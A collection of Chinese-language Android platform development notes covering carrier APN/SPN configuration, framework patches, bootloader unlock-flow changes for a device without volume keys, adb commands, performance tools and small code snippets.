<1>.如运营商Cherry Prepaid,MVNO和对应MNO的MCC/MNC是相同的,我们就需要MVNO定义额外的标识来和对应MNO做区分。
      
      1.首先,我们在vendor\sprd\operator\operator_res\apn\apns-conf_8.xml添加Cherry Prepaid 匹配不同的 mvno_match_data
    <apn carrier="Cherry Prepaid "
        mcc="515"
        mnc="02"
        apn="internet.cherry.com.ph"
        server="http://www.cherrymobile.com.ph"
        mvno_type="spn"
        mvno_match_data="Cherry Prepaid" 
        type="default"
    />
    <apn carrier="Cherry Prepaid"
        mcc="515"
        mnc="02"
        apn="internet.cherry.com.ph"
        server="http://www.cherrymobile.com.ph"
        mvno_type="spn"
        mvno_match_data="Cherry Mobile" 
        type="default"
    />
   2.在vendor\sprd\oem\config\GlobalConfig\virtual-net-rule\virtual-net-rule-conf.xml 匹配MVNO
   <virtualnet numeric="51502" carrier="Cherry Prepaid" mvno_type="spn" mvno_match_data="Cherry Prepaid"/>
   <virtualnet numeric="51502" carrier="Cherry Prepaid" mvno_type="spn" mvno_match_data="Cherry Mobile"/>

   3.在vendor\sprd\oem\config\GlobalConfig\spn\virtual-spn-conf.xml 匹配对应的spn
   <spnOverride numeric="51502" mvno="51502Cherry Prepaid" spn="Cherry Prepaid"/>
   <spnOverride numeric="51502" mvno="51502Cherry Prepaid" spn="Cherry Mobile"/>
```

## [SPRD] 虚拟运营商APN、SPN参数、Sim卡名称

```text
1.APN配置：
S7731C5.1:
vendor\sprd\operator\operator_res\apn\apns-conf_8.xml
S7731G/C6.0:
vendor\sprd\overlay\apn\apns-conf_8.xml
…
  <apn carrier="GLobe Prepaid"
       mcc="515"
       mnc="02"
       apn="http.globe.com.ph"
       server="http://www.globe.com.ph/globe.asp"
       type="default,supl"
   />
  <apn carrier="Cherry Prepaid"
       mcc="515"
       mnc="02"
       apn="internet.cherry.com.ph"
       server="http://www.cherrymobile.com.ph"
       mvno_type="spn"
       mvno_match_data="Cherry Prepaid"
       type="default"
   />
   <apn carrier="Cherry Prepaid"
       mcc="515"
       mnc="02"
       apn="internet.cherry.com.ph"
       server="http://www.cherrymobile.com.ph"
       mvno_type="spn"
       mvno_match_data="Cherry Mobile"
       type="default"
/>
…
虚拟运营商mvno_type要配成spn，mvno_match_data是spn配置的数据内容。
不带mvno_type的是实体运营商。

2.SPN配置：
S7731C5.1:
vendor\sprd\oem\config\GlobalConfig\virtual-net-rule\virtual-net-rule-conf.xml
<virtualnetnumeric="51502" carrier="Cherry Prepaid" mvno_type="spn" mvno_match_data="CherryPrepaid"/>
<virtualnetnumeric="51502" carrier="Cherry Prepaid" mvno_type="spn" mvno_match_data="CherryMobile"/>
<virtualnetnumeric="51502" carrier="Globe Prepaid" mvno_type="spn" mvno_match_data="TM"/>
<virtualnetnumeric="51502" carrier="Globe Prepaid" mvno_type="spn" mvno_match_data="ABS-CBN"/>
<virtualnetnumeric="51503" carrier="Smart Internet" mvno_type="spn" mvno_match_data="Talk N Text"/>
其中mvno_match_data数据为APN里的mvno_match_data，carrier="Cherry Prepaid"为APN里的carrier
最后配置如下文件：
vendor\sprd\oem\config\GlobalConfig\spn\virtual-spn-conf.xml
<spnOverride numeric="51502"mvno="51502Cherry Prepaid" spn="Cherry Prepaid"/>
<spnOverride numeric="51502"mvno="51502Cherry Prepaid" spn="Cherry Mobile"/>
<spnOverride numeric="51502"mvno="51502Globe Prepaid" spn="TM"/>
<spnOverride numeric="51502"mvno="51502Globe Prepaid" spn="ABS-CBN"/>
<spnOverride numeric="51503"mvno="51503Smart Internet" spn="Talk N Text"/>
其中mvno数据为mcc+mnc+APN里配置的apn carrier，spn="Cherry Prepaid"为Sim卡要显示的名称。
虚拟运营商Sim卡名称检索规则：
1.根据APN里的mvno_type="spn"判断是虚拟运营商
2.根据virtual-net-rule-conf.xml查找匹配的SPN顺序ID
3.根据顺序ID在virtual-spn-conf.xml里查找对应的名称
因此这三张表里涉及到SPN的数据要一项一项对应，顺序不能错乱！

S7731G/C6.0:
packages\apps\CarrierConfig\assets\carrier_config_51502.xml
packages\apps\CarrierConfig\assets\carrier_config_51503.xml
……
   <carrier_config spn="CherryPrepaid">
        <boolean name="mvno"value="true"/>
        <stringname="spn">Cherry Prepaid</string>
    </carrier_config>
    <carrier_configspn="Cherry Mobile">
       <boolean name="mvno" value="true"/>
       <stringname="spn">Cherry Prepaid</string>
   </carrier_config>
   <carrier_configspn="TM">
        <boolean name="mvno"value="true"/>
        <stringname="spn">TM</string>
    </carrier_config>
    <carrier_configspn="ABS-CBN">
        <boolean name="mvno"value="true"/>
        <stringname="spn">ABS-CBN</string>
    </carrier_config>
……
<carrier_configspn="Cherry Mobile">为APN配置里的mvno_match_data数据，
<stringname="spn">Cherry Prepaid</string>为要显示的SIM卡名称。

3.运营商名称不显示2G/3G/4G:
S7731G/C 6.0:
SystemUIPluginsHelper.java 和KeyguardPluginsHelper.java修改如下
protected String appendRatToNetworkName(Context context, ServiceState state, String operator){
       String operatorName = operator;
       SystemUiConfig config = SystemUiConfig.getInstance(context);
       if (context == null || state == null || !getBoolAppendRAT()) {
           return operatorName;
       }
       if(OptConfig.SUN_C7359_C5D_FWVGA_CHERRY){//Kalyy
           return operatorName;
       }
……
}
```

## Android 7.0 如何去掉灭屏动画

```text
frameworks/base/services/core/java/com/android/server/display/DisplayPowerController.java
private void updatePowerState() {
    .......
    switch (mPowerRequest.policy) {
        case DisplayPowerRequest.POLICY_OFF:
            state = Display.STATE_OFF;
            performScreenOffTransition = false; //改为true 就可以打开灭屏动画
            break;
    ........
}
```

## 设置静态墙纸后，文件保存在哪里?

```text
通过launcher、文件管理器、图库等应用选择的静态墙纸，设置后会由WallpaperManagerService.java (frameworks\base\services\java\com\android\server)保存起来。

保存的地方为WallpaperManagerService.java中定义的文件WALLPAPER_FILE中,android各版本之间，保存路径有区别。

以android4.0.3为例：
static final File WALLPAPER_DIR = new File("/data/data/com.android.settings/files");
static final String WALLPAPER = "wallpaper";
static final File WALLPAPER_FILE = new File(WALLPAPER_DIR, WALLPAPER);
保存文件的路径为 /data/data/com.android.settings/files/wallpaper

墙纸保存的文件格式为bmp。
执行如下adb命令,pull出来静态墙纸文件wallpaper，更改文件名后缀为bmp(更名后为wallpaper.bmp），就可以用PC机查看墙纸图片。
adb pull /data/data/com.android.settings/files/wallpaper

设置为静态墙纸后，文件夹、图库中的原图片可以删除，不影响墙纸的显示。
```

## [CMD] #!/usr/bin/env python与#!/usr/bin/python的区别

```text
#!/usr/bin/Python是告诉操作系统执行这个脚本的时候，调用/usr/bin下的python解释器；
#!/usr/bin/env python这种用法是为了防止操作系统用户没有将python装在默认的/usr/bin路径里。当系统看到这一行的时候，首先会到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成操作。
#!/usr/bin/python相当于写死了python路径;

#!/usr/bin/env python会去环境设置寻找python目录,推荐这种写法
```

## [CMD] Linux Python shell 执行文件之间的文件调用

```text
#!/bin/bash
echo 'start call py'
./frompy.py
echo 'end call py'



#!/usr/bin/python
import sys
import os

print "start call sh file"
os.system('./fromsh.sh')
print "end call sh file"
```

## [log] Android开发过程中在sh，py，mk文件中添加log信息的方法

```text
在sh文件中
echo "this is a log info" + $info
在py文件中
print ("this is a log info ",info)
在mk文件中
$(warning warning:'this is a log info')
```

## [CMD] 配合Alfred的mac端自动截图脚本

```text
#!/bin/bash
 
time=$(date "+%Y%m%d%H%M%S")
 
adb devices | tr -s '\n' | awk '{print $1}'| sed -n '2,$p'| while read line
do
 echo 安卓设备id:$line
 adb -s $line shell screencap -p /sdcard/$line+$time.png < /dev/null ;
    adb -s $line pull /sdcard/$line+$time.png /Users/bytedance/Desktop/app截图/安卓 < /dev/null ;
done
 
open /Users/bytedance/Desktop/app截图/安卓
```

## Android P 没有音量物理按键，如何remount设备

```text
因为设备特殊的原因，只有power键，并没有控制音量的物理按键。所以想要 remount 设备的话，需要更改一下代码的逻辑。
代码路径vendor/mediatek/proprietary/bootable/bootloader/lk/app/mt_boot/sec_unlock.c

@@ -335,8 +335,8 @@ void fastboot_oem_unlock(const char *arg, void *data, unsigned sz)
 
  unlock_warranty();
 
- while (1) {
-  if (mtk_detect_key(MT65XX_MENU_SELECT_KEY)) { //VOL_UP
+ /*while (1) {
+   if (mtk_detect_key(MT65XX_MENU_SELECT_KEY)) { //VOL_UP
    fastboot_info("Start unlock flow\n");
    //Invoke security check after confirming "yes" by user
    ret = fastboot_get_unlock_perm(&unlock_allowed);
@@ -383,8 +383,44 @@ void fastboot_oem_unlock(const char *arg, void *data, unsigned sz)
   } else {
    //If we press other keys, discard it.
   }
+ }*/
+
+ fastboot_info("Start unlock flow\n");
+ //Invoke security check after confirming "yes" by user
+ ret = fastboot_get_unlock_perm(&unlock_allowed);
+ if (ret != B_OK) {
+  sprintf(msg, "\nFailed to get unlock permission - Err:0x%x \n", ret);
+  video_printf("Unlock failed...return to fastboot in 3s\n");
+  mdelay(3000);
+  fastboot_boot_menu();
+  fastboot_fail(msg);
+  return;
  }
 
+ dprintf(CRITICAL,"unlock_allowed = 0x%x\n", unlock_allowed);
+
+ if (!unlock_allowed) {
+  sprintf(msg, "\nUnlock operation is not allowed\n");
+  video_printf("Unlock failed...return to fastboot in 3s\n");
+  mdelay(3000);
+  fastboot_boot_menu();
+  fastboot_fail(msg);
+  return;
+ }
+
+ ret = fastboot_oem_unlock_chk();
+ if (ret != B_OK) {
+  sprintf(msg, "\nUnlock failed - Err:0x%x \n", ret);
+  video_printf("Unlock failed...return to fastboot in 3s\n");
+  mdelay(3000);
+  fastboot_boot_menu();
+  fastboot_fail(msg);
+ } else {
+  video_printf("Unlock Pass...return to fastboot in 3s\n");
+  mdelay(3000);
+  fastboot_boot_menu();
+  fastboot_okay("");
+ }
  return;
 }
 
@@ -440,4 +476,3 @@ void fastboot_oem_lock(const char *arg, void *data, unsigned sz)
 
  return;
 }
```

## 暴力解决android设备自定义桌面问题

```text
鉴于设备原因桌面设置异常，而博主的项目不需要显示系统桌面，所以决定对其进行暴力删除。

一、adb shell到设备下，解除系统权限

ro就是当前system是只读权限，所以只要更改权限即可。
mount   -o  remount,rw  /dev/block/mmcblk0p5  /system
mount   -o  remount,ro  /dev/block/mmcblk0p5  /system
```

## android10 c语言测试字符设备程序

```text
高通平台上测试spi字符设备程序，如下：

#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/ioctl.h>
#include <sys/stat.h>
#include <linux/types.h>
#include <linux/spi/spidev.h>
   
//定义要访问的设备文件名
static const char *device = "/dev/dev_mcu"  ;
    
int main() {
    int i;
    int fd = -1;  
    char val[] ={0x02,0xd1,0x0a,0x00,0x01,0xc6,0x29} ;
    char ret[255]  ;
    //打开设备文件
    printf("start to open device .\n");
    // udelay(1000);
    fd = open(device, O_RDWR);  
    if(fd == -1) {  
        printf("Failed to open device .\n");  
        return -1;  
    }  
    
    printf("start to open device  succesful. \n");
    //写入   
    for(i=0;i<7;i++)
    printf("Write index %x value 0x%02x to %s.\n\n",i, val[i] , device);  
    write(fd, val, sizeof(val));      
    //读取respone值    
    printf("Read ret value :\n");
    for(i=0;i<9;i++){  
        read(fd, ret, 1);
        // printf("index %d : 0x%02x.\n\n", i,ret[0] );
    }   
    printf("read device  end. \n");
    close(fd);
    return 0;
}

Android.mk文件如下：

LOCAL_PATH := $(call my-dir)
commonSources :=
commonSharedLibraries := libc libcutils libutils

include $(CLEAR_VARS)
LOCAL_MODULE := spitest
LOCAL_SRC_FILES += $(commonSources) main.c
LOCAL_C_INCLUDES := $(TARGET_OUT_INTERMEDIATES)/KERNEL_OBJ/usr/include/
LOCAL_ADDITIONAL_DEPENDENCIES := $(TARGET_OUT_INTERMEDIATES)/KERNEL_OBJ/usr
LOCAL_SHARED_LIBRARIES := $(commonSharedLibraries)
LOCAL_MODULE_TAGS := optional
LOCAL_MODULE_PATH := $(TARGET_OUT_DATA)/kernel-tests
LOCAL_MODULE_OWNER := qcom
include $(BUILD_EXECUTABLE)
```

## 自定义Toast显示时长

```text
public void showMyToast(final Toast toast, final int cnt) {  
    final Timer timer = new Timer();  
    timer.schedule(new TimerTask() {  
        @Override  
        public void run() {  
            toast.show();  
        }  
    }, 0, 3000);  
    new Timer().schedule(new TimerTask() {  
        @Override  
        public void run() {  
            toast.cancel();  
            timer.cancel();  
        }  
    }, cnt);  
}  
Toast toast = Toast.makeText(RegistActivity.this, "这是可以随意设置时间的Toast", Toast.LENGTH_LONG);
showMyToast(toast, 10*1000);  //设置显示的时间
```

## [性能] 性能分析工具 — bootchart 工具使用(android 8.1)

```text
bootchart 在 android 平台的使用步骤
在 android 源码路径 system/core/init/README.md 中包含了对 bootchart 的使用说明。
1.PC 机安装 bootchart 工具
sudo apt-get install bootchart
sudo apt-get install pybootchartgui 

2. 打开 bootchart 收集开机数据
方法一：
1. adb shell 'touch /data/bootchart/enabled'
首先使能 bootchart，bootchart 操作的前提是存在 enable 标记，所以
在你不需要收集数据的时候别忘了删除这个标记。
2. echo 600 > /data/bootchart/start
添加 bootchart timeout 时间,最大可设置为600
3. reboot 重启
4. 可以看到 bootchart 生成的数据文件和 log 都被保存在 /data/bootchart 路径下
5. tar -zcf boochart.tgz *    （adb shell 进入log情况下执行此打包命令）
6. 使用 adb pull 命令将文件拷贝出来
adb pull /data/bootchart/boochart.tgz /源码根目录
7.执行 源码目录/system/core/init/grab-bootchart.sh,文件

方法二：
1. adb shell 'touch /data/bootchart/enabled'
2. adb reboot
3. tar -zcf boochart.tgz *
4. 使用 adb pull 命令将文件拷贝出来
adb pull /data/bootchart/boochart.tgz /PC目录
5.刚才拷贝出来的PC目录下执行
bootchart boochart.tgz 

方法三：
1. adb shell 'touch /data/bootchart/enabled'
2. adb reboot
3. 执行 源码目录/system/core/init/grab-bootchart.sh,文件
https://www.jianshu.com/p/933db9a5783e
https://blog.csdn.net/qq_19923217/article/details/81043736
https://elinux.org/images/4/4c/Android-bootup-time-linuxcon-2010-08.pdf


The package name changed for systemd from bootchart to systemd-bootchart
Try installing systemd-bootchart in 18.04 and newer.
```

## [性能] android系统裁剪之原生so库精简

```text
so库指的是/system/lib目录下的so文件，对于这部分的精简是比较麻烦的，而且对于功能要求相对健全的情况下，能够精简掉的so库也确实很少，最初盯上这块的原因是因为接触到的项目不需要libwebviewchromium.so库，这一个库就有20M+，实在是很客观，所以就研究了一下。

通过分析运行库文件源码的Android.mk文件，发现一个运行库文件编译运行时经常依赖其他的运行库，且该库本身又有可能被其他运行库所依赖，所以对Android系统运行库裁剪的主要难点是处理好库与库之间的依赖关系。最后还需要弄清楚有没有apk依赖这些so库，如果有apk依赖的so库的话，也需要调查清楚是否需要保留so库，还是干脆直接将apk也一并删除。

首先弄清楚库与库之间的相互关系，这里通过在/system/lib目录下运行一个简单的shell脚本来弄清楚相互关系。就不需要挨个找so的源码makefile来确认依赖关系了。

#!/bin/sh
path=$(pwd)
string1="编译依赖于以下其他包："
cd $path
for file in $(ls *)
do
    if [ "${file##*.}"x = "so"x ] ;then
        echo $file,$string1
        readelf -d $file | grep "Shared library" | awk -F ":" '{print $2}'
    fi
done
上面的脚本可以生成每个库文件的编译的时候，依赖了哪些其他的库文件，弄清楚这些之后，我们心里就有谱了，如果要删除某一个库，是会牵连到其他的哪些库文件。
上面弄清楚之后我们还需要在源码/framework和/packages目录下进行搜索，确保要删除的so库不被framework和一些app所依赖。

最后如果确定待删除的so库可以删除，就找到这个so库的源码位置，将Android.mk文件干掉即可。
```

## [性能] android系统裁剪之ICU软件库精简

```text
ICU库是一个支持国际化，本地化的软件库。对于纯中英文的系统，ICU还是很有必要精简一下的。
这个软件库的编译是不依赖android源码编译的，android源码只是集成了ICU编译之后生成的dat文件而已，ICU的具体编译方法在源码中已经提供了，具体说明在 /external/icu4c/stubdata$ vim readme.txt

最后附上两篇文章，这两篇已经讲得很好了。
http://blog.gclxry.com/custom-chromium-icu-library/
http://chenggoi.com/2015/01/06/Android_ICU_Customizing/
```

## [算法] 统计一个32位整数中1的个数

```text
https://blog.csdn.net/weiqifa0/article/details/105108594

大神的代码
int count_bits(int x) {
    register int xx=x;
    xx=xx-((xx>>1)&0x55555555);
    xx=(xx&0x33333333)+((xx>>2)&0x33333333);
    xx=(xx+(xx>>4))&0x0f0f0f0f;
    xx=xx+(xx>>8);
    return (xx+(xx>>16)) & 0xff;
}
```

## Android系统开发的特权白名单

```text
特权应用
什么是特权应用?位于系统分区的priv-app目录下的应用就是特权应用。不同的Android版本定义的分区如下

小于等于Android 8.1的版本，特权分区为/system。
大于等于Android 9的版本，特权分区为/system, /product和/vendor。
例如，从Android 9开始，/product/priv-app目录下的应用就是特权应用。

系统的特许权限
从Android 8.0开始，特权应用如果使用系统的特许权限，那么需要把这个特许权限加入到白名单中。

那么什么是系统的特许权限? 系统的特许权限必须在frameworks/base/core/res/AndroidManifest.xml定义，并且等级为signature|privileged

<permission
    android:name="com.permission.test"
    android:protectionLevel="signature|privileged" />
白名单文件
刚才说到，如果一个特权应用使用了系统的特许权限，那么我们要把这个特许权限加入到白名单中。

那么这个白名单文件在哪呢?如果特权应用在/vendor分区，那么白名单文件就必须在/vendor/etc/permissions/目录下。

那么这些白名单文件来自哪里呢?一般是来自frameworks/base/data/etc/目录，也有的是来自应用，这些应用通过Android.mk或Android.bp把白名单文件编译到指定目录。

这里以frameworks/base/data/etc/目录为例，在我的项目中有如下文件

Android.bp
com.android.carrierconfig.xml
com.android.contacts.xml
com.android.dialer.xml
com.android.documentsui.xml
com.android.emergency.xml
com.android.launcher3.xml
com.android.provision.xml
com.android.settings.intelligence.xml
com.android.settings.xml
com.android.storagemanager.xml
com.android.systemui.xml
com.android.timezone.updater.xml
framework-sysconfig.xml
hiddenapi-package-whitelist.xml
platform.xml
privapp-permissions-platform.xml
特权应用如果使用了系统特许权限，一般会把白名单添加到privapp-permissions-platform.xml文件中。当然也可以单独建立一个文件，例如com.android.systemui.xml就是SystemUI的特权白名单文件。

那么这些白名单文件如何编译到系统分区呢，这是由frameworks/base/data/etc/Android.bp决定的，部分代码如下

prebuilt_etc {
    // 配置文件的别名
    name: "privapp-permissions-platform.xml",
    // 配置文件的目录
    sub_dir: "permissions",
    // 源配置文件名
    src: "privapp-permissions-platform.xml",
}
 
prebuilt_etc {
    name: "privapp_whitelist_com.android.carrierconfig",
    // 配置文件添加到product分区
    product_specific: true,
    sub_dir: "permissions",
    src: "com.android.carrierconfig.xml",
    filename_from_src: true,
}
第一个prebuilt_etc模块是把privapp-permissions-platform.xml默认编译到/system分区下的/system/etc/permissions目录下。

第一个prebuilt_etc模块，由于定义了product_specific: true，所以把配置文件编译到/product分区。

由于我对Android.bp语法缺乏了解，暂时不知道如何把配置文件编译到vendor分区，如果有知道的朋友可以告诉我。

为特权应用添加白名单
假如现在我在frameworks/base/core/res/AndroidManifest.xml中定义了如下一个特权

<permission
    android:name="com.permission.test"
    android:protectionLevel="signature|privileged" />
然后在SettingsProvider的AndroidManifest.xml中使用了这个权限

<uses-permission android:name="com.permission.test" />
你可以参照特权白名单文件，为应用添加白名单内容，这需要手动操作。但是如果你已经把源码编译过，那么可以通过执行development/tools/privapp_permissions/privapp_permissions.py这个脚本看到你需要配置的信息，例如对于上面例子，会显示如下信息

<?xml version="1.0" encoding="utf-8"?>
<permissions>
    <privapp-permissions package="com.android.providers.settings">
        <permission name="com.permission.test"/>
    </privapp-permissions>
</permissions>
这就是白名单内容，我们可以把这个内容放到frameworks/base/data/etc/privapp-permissions-platform.xml，也可以单独生成一个文件，名为com.android.providers.settings.xml。如果是生成单独一个文件 ，那么还需要在Android.bp中进行编译配置。
```

## Android ".nomedia" 文件的使用

```text
系统媒体数据库无法扫描到数据
1.插入一张SDCARD
2.push 3000左右图片到sdcard
3.重启
4.观察发现手机不能读取到图片数据 （读取方法：Images.Media.getContentUri(“external”)获取uri, 然后读取数据库）
5.push 1首歌曲
6.重启进入music,等待扫描结束,music不能显示歌曲

根本原因是：
多媒体文件所在目录下有.nomedia文件，因此，MediaProvider会把该目录的文件识别为普通文件，具体表现是在db文件中media_type的值为0； 因此在image、video 、audio等视图中通过type查询时，是查询不到信息的。 该问题的原因就在目录中有了.nomedia文件

.nomedia产生的原因：
在MediaProvider.apk中是不会自动添加该文件的； 一般.nomedia文件是由其他apk的一些设置等操作才会添加。由于缺乏信息且无法复现，无法分析是什么产生的。

官网对.nomedia的解释：
在媒体扫描程序中隐藏您的文件在您的外部文件目录中包含名为 .nomedia的空文件（注意文件名中的点前缀）。
这将阻止媒体扫描程序读取您的媒体文件，并通过 MediaStore内容提供程序将其提供给其他应用。但如果您的文件真正是应用的私有文件，则应该将其保存在应用私有的目录中。

新建.nomedia文件的方法：
1. Windows系统的新建文件不能新建.nomedia文件新建方法：
new File(dir, ".nomedia").createNewFile();

2. CMD命令行
copy con .nomedia 回车
然后此时屏幕上有一个光标在闪烁，说明等待你输入该文件内容，如果想建立空内容文件，这里就什么都不输入，这时按下ctrl+Z键再回车，就生成一个空文件。
3. Linux Shell
touch .nomedia

实现原理分析 https://blog.csdn.net/weixin_30722589/article/details/96579761
```

## [工具] Minicom的使用

```text
Minicom是linux上类似Windows的hyperteminal.串口终端工具
运行Minicom
sudo minicom –s
端口配置，设备名可以在/dev下找到，通常是ttyUSB*, ttyS*, ttyACM*，可以插拔下看出来
可以选'Save setup as dfl', 这样下次不要再配置。
配置好后，选Exit退出(Not ‘Exit from Minicom’)。
此时可以看到LOG（如果已经连好设备），或者输入命令，如AT
如果要保存文件，先按下CTRL+A,松键后，再按Z
按L键，此时可以输入文件名
按X键，退出配置
```

## 关机时间修改

```text
frameworks/base/services/core/java/com/android/server/power/ShutdownThread.java
private static final int MAX_SHUTDOWN_WAIT_TIME = 20 * 1000;

关机时间过长的问题
把MAX_SHUTDOWN_WAIT_TIME由20s改成10s
private static final int MAX_SHUTDOWN_WAIT_TIME = 10 * 1000;//forlan modified to 10s for reboot and shutdown more quickly
```

## [clock] 配置时间服务器+亚洲主要的授时服务器

```text
我们知道，android是通过连接指定的ntpServer来获取网络时间，而不同的服务器带来的延迟也不尽相同，通常情况下，我们自然是期望尽快获取时间，那么我们就需要对ntpServer有一定的筛选，尤其是在选择默认的ntpServer的时候。

android中配置ntpServer的源文件：

frameworks/base/core/res/res/values/config.xml

此外，调整一下切换不同服务器之间的timeout也能加快获取网络时间

亚洲主要的一些授时服务器：
http://www.pool.ntp.org/zone/asia

本猿实际测试中发现，下列服务器响应比较快，最大的平均响应时间低于150ms（可能与网络也有一定的关系，不同地方可能有较大的差异）：

sg.pool.ntp.org
tw.pool.ntp.org
3.asia.pool.ntp.org
jp.pool.ntp.org
cn.pool.ntp.org
hk.pool.ntp.org
th.pool.ntp.org
s2g.time.edu.cn

PS:国内主要的ntp服务器地址：
http://www.douban.com/note/171309770/
```

## 安装带so库的apk后导致系统运行异常，提示其他apk stopped

```text
对于系统权限级别的应用，系统在加载so的时候貌似会遵循这样一个原则：如果首个应用加载的是32位/64位的so，那么就默认会以32位/64位so为基准去加载其他的系统级别应用的so，于是乎就造成了系统加载so错乱。但是非系统权限级别的apk的so则不会存在此问题，不论是32还是64都不会影响到其他系统权限级别的so的加载。

解决办法：
去掉AndroidManiFest.xml里面的android:sharedUserId=”android.uid.system”之后，重新运行，验证ok。

总体而言，关于so库问题以下2点需要注意：
1.so库位数
2.apk的权限级别，清单文件里面是否有android:sharedUserId=”android.uid.system”属性
```

## [知识点] IPTV盒子和OTT盒子的区别

```text
OTT：over the top，通过互联网向用户提供各种应用服务
IPTV：internet protocol television，互联网协议电视

技术上的区别：
OTT是走的公网，也就是通过IP网络连接互联网，和你电脑上网是同一张网。
IPTV是走的私网，也是通过IP网络，但没有连接互联网，直接指向IPTV平台，形象点的说就是IPTV自己形成了一个局域网。

OTT走的公网，因此它比IPTV更开放自由。
IPTV走的私网，因此它在观看节目的质量、稳定性方面，都比OTT更有保障。

政策上的区别：
目前国家规定OTT上不能有直播，而IPTV可以有直播。
```

## 重启桌面时间小部件加载慢

```text
diff --git a/frameworks/base/services/appwidget/java/com/android/server/appwidget/AppWidgetServiceImpl.java b/frameworks/base/services/appwidget/java/com/android/server/appwidget/AppWidgetServiceImpl.java
index 7797f89d11..5cd6a92be8 100755
--- a/frameworks/base/services/appwidget/java/com/android/server/appwidget/AppWidgetServiceImpl.java
+++ b/frameworks/base/services/appwidget/java/com/android/server/appwidget/AppWidgetServiceImpl.java
@@ -2321,12 +2321,14 @@ class AppWidgetServiceImpl extends IAppWidgetService.Stub implements WidgetBacku
 
     private void sendEnableIntentLocked(Provider p) {
         Intent intent = new Intent(AppWidgetManager.ACTION_APPWIDGET_ENABLED);
+        intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);//add dengli for Restart the desktop clock widget to load slowly
         intent.setComponent(p.info.provider);
         sendBroadcastAsUser(intent, p.info.getProfile());
     }
 
     private void sendUpdateIntentLocked(Provider provider, int[]  appWidgetIds) {
         Intent intent = new Intent(AppWidgetManager.ACTION_APPWIDGET_UPDATE);
+        intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);//add dengli for Restart the desktop clock widget to load slowly
         intent.putExtra(AppWidgetManager.EXTRA_APPWIDGET_IDS, appWidgetIds);
         intent.setComponent(provider.info.provider);
         sendBroadcastAsUser(intent, provider.info.getProfile());
```

## 添加APP后台防杀机制

```text
开发过程中遇到在系统资源紧张的时候，后台进程被LMK杀死的情况，下面提供一个防杀策略，供参考：

diff --git a/services/core/java/com/android/server/am/ActivityManagerService.java b/services/core/java/com/android/server/am/ActivityManagerService.java
index 65d75784..bf3bd533 100644
--- a/services/core/java/com/android/server/am/ActivityManagerService.java
+++ b/services/core/java/com/android/server/am/ActivityManagerService.java
@@ -24675,6 +24675,16 @@ public class ActivityManagerService extends IActivityManager.Stub
         int changes = 0;
 
         if (app.curAdj != app.setAdj) {
+            // kbding add this for preventing ocr killing by lmk.
+            String[]  packages = app.getPackageList();
+            if (packages != null) {
+                for (String p : packages){
+                    if(p.equals("com.iflytek.ocr")){
+                        app.curAdj = -1;
+                        break;
+                    }
+                }
+            }
             ProcessList.setOomAdj(app.pid, app.uid, app.curAdj);
             if (DEBUG_SWITCH || DEBUG_OOM_ADJ || mCurOomAdjUid == app.info.uid) {
                 String msg = "Set " + app.pid + " " + app.processName + " adj "

过滤需要防杀的包名，将其curAdj赋值，这个值越大，LMK在清理内存的时候就会优先清理，因此赋值-1防杀。
```

## [bug] Android P MTK 添加新用户再删除，会一直卡在界面，无任何应用，下拉状态栏才会恢复正常

```text
[MT6763_9.0]  [Multi-user] Add a new user and delete it, it will always be stuck in the interface, without any application, the drop-down status bar will return to normal.

diff --git a/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/phone/PanelView.java b/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/phone/PanelView.java
old mode 100644
new mode 100755
index 92b9266392..9177ae95ae
--- a/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/phone/PanelView.java
+++ b/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/phone/PanelView.java
@@ -854,10 +854,10 @@ public abstract class PanelView extends FrameLayout {
         if (isFullyCollapsed()) {
             return;
         }
-
-        if (currentMaxPanelHeight == mExpandedHeight) {
-            return;
-        }
+        //modify dengli
+        //if (currentMaxPanelHeight == mExpandedHeight) {
+        //    return;
+        //}

         if (mPeekAnimator != null || mPeekTouching) {
             return;
diff --git a/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/stack/NotificationStackScrollLayout.java b/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/stack/NotificationStackScrollLayout.java
old mode 100644
new mode 100755
index 28e3ef5db2..174c4e366d
--- a/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/stack/NotificationStackScrollLayout.java
+++ b/vendor/mediatek/proprietary/packages/apps/SystemUI/src/com/android/systemui/statusbar/stack/NotificationStackScrollLayout.java
@@ -4512,11 +4512,12 @@ public class NotificationStackScrollLayout extends ViewGroup
     }

     public void setMaxDisplayedNotifications(int maxDisplayedNotifications) {
-        if (mMaxDisplayedNotifications != maxDisplayedNotifications) {
+        //modify dengli
+        //if (mMaxDisplayedNotifications != maxDisplayedNotifications) {
             mMaxDisplayedNotifications = maxDisplayedNotifications;
             updateContentHeight();
             notifyHeightChangeListener(mShelf);
-        }
+        //}
     }

     public void setShouldShowShelfOnly(boolean shouldShowShelfOnly) {
```

## [CB] 使用模拟器模拟小区广播（Cell BroadCast）

```text
小区广播分为发送端（广播站）和接收端（手机）

由于国内大部分地区手机都不支持小区广播，因此遇到小区广播相关问题，调试起来较为麻烦。

而Mocor的模拟器提供了一种简单的模拟小区广播的方法，具体设置模拟操作如下：

1.在模拟器控制面板的Cell BroadCast页面，默认配置了4中type类型的Message
2.选择需要模拟的Message type，设置间隔时间，并置为Enable状态
3.记录Enable的Message type的Message ID，比如Traffic类型的ID是0x03EE(十进制对应为1006)
4.进入模拟器SMS-Broadcast message-左键Option-Setting（不同的手机菜单稍有差异，以实际为准）
5.选择“On”
6.进入Channel settings->左键Option->Add channel
7.在channel index处，填入刚才控制面板上的Message ID（需要填写十进制，如Traffic即对应1006）
8.在模拟器控制面板上Cell BroadCase页面的Contents处填入需要发送的广播内容，点击Apply发送
9.模拟器上提示收到该广播，同时达到相应的间隔时间后，发送端会继续发送广播给模拟器。
```

## [sprd] android手机当U盘使用

```text
1、设置persist.sys.usb.config为mass_storage
device\sprd\sharkle\common\DeviceCommon.mk
persist.sys.usb.config=mass_storage

